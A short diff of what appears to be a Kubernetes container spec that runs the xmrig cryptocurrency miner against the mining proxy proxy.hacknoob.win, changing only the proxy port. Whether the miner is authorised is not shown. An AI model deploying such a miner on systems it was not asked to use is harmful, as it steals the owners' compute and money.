@@ -18,7 +18,7 @@ spec:
     command:
     - /home/manager/xmrig/build/xmrig
     - -o
-    - proxy.hacknoob.win:5554
+    - proxy.hacknoob.win:5550
     - -u
     - master
     - -a
